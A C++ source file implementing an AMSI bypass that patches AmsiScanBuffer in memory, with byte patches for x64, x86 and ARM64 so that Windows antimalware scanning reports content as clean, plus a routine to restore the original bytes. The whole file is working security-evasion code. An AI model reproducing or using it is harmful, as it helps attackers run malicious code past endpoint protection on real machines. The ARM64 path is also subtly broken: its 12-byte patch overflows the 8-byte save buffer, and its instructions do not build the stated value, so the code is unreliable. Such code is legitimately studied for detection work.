#include "stdafx.h"
#include "amsi_bypass.h"
#include "logger.h"

namespace AmsiBypass {

namespace {

PVOID g_pAmsiScanBuffer = nullptr;
BYTE g_originalBytes[8] = {};
size_t g_patchSize = 0;
bool g_patched = false;

} // namespace

bool Initialize() {
    if (g_pAmsiScanBuffer) return true;

    // amsi.dll may not be loaded yet — force load it
    HMODULE hAmsi = GetModuleHandleW(L"amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryW(L"amsi.dll");
    }
    if (!hAmsi) {
        VERBOSE(L"AmsiBypass: amsi.dll not available (AMSI not active)");
        return false;
    }

    g_pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!g_pAmsiScanBuffer) {
        LOG(L"AmsiBypass: AmsiScanBuffer not found in amsi.dll");
        return false;
    }

    VERBOSE(L"AmsiBypass: AmsiScanBuffer at %p", g_pAmsiScanBuffer);
    return true;
}

bool PatchAmsiScanBuffer() {
    if (g_patched) return true;
    if (!Initialize()) return false;

    PBYTE pFunc = (PBYTE)g_pAmsiScanBuffer;

#ifdef _M_AMD64
    // x64: Patch with:
    //   mov eax, 0x80070057  (E_INVALIDARG — forces AMSI_RESULT_CLEAN path)
    //   ret
    // This is 6 bytes: B8 57 00 07 80 C3
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    g_patchSize = sizeof(patch);
#elif defined(_M_IX86)
    // x86: Same approach, different calling convention
    //   mov eax, 0x80070057
    //   ret 0x18 (stdcall cleanup for 6 args * 4 bytes)
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
    g_patchSize = sizeof(patch);
#elif defined(_M_ARM64)
    // ARM64:
    //   mov w0, #0x80070057 (encoded as two MOV instructions)
    //   ret
    BYTE patch[] = {
        0xE0, 0x0A, 0x80, 0x52,  // mov w0, #0x57
        0x00, 0x0E, 0xA0, 0x72,  // movk w0, #0x0070, lsl #16
        0xC0, 0x03, 0x5F, 0xD6   // ret
    };
    g_patchSize = sizeof(patch);
#else
    LOG(L"AmsiBypass: Unsupported architecture");
    return false;
#endif

    // Save original bytes
    memcpy(g_originalBytes, pFunc, g_patchSize);

    // Change protection, apply patch, restore protection
    DWORD oldProtect = 0;
    if (!VirtualProtect(pFunc, g_patchSize, PAGE_READWRITE, &oldProtect)) {
        LOG(L"AmsiBypass: VirtualProtect failed: %u", GetLastError());
        return false;
    }

    memcpy(pFunc, patch, g_patchSize);
    VirtualProtect(pFunc, g_patchSize, oldProtect, &oldProtect);

    g_patched = true;
    VERBOSE(L"AmsiBypass: AmsiScanBuffer patched (%zu bytes)", g_patchSize);
    return true;
}

bool RestoreAmsiScanBuffer() {
    if (!g_patched || !g_pAmsiScanBuffer) return false;

    PBYTE pFunc = (PBYTE)g_pAmsiScanBuffer;

    DWORD oldProtect = 0;
    if (!VirtualProtect(pFunc, g_patchSize, PAGE_READWRITE, &oldProtect)) {
        LOG(L"AmsiBypass: VirtualProtect (restore) failed: %u", GetLastError());
        return false;
    }

    memcpy(pFunc, g_originalBytes, g_patchSize);
    VirtualProtect(pFunc, g_patchSize, oldProtect, &oldProtect);

    g_patched = false;
    VERBOSE(L"AmsiBypass: AmsiScanBuffer restored");
    return true;
}

bool IsPatched() {
    return g_patched;
}

} // namespace AmsiBypass
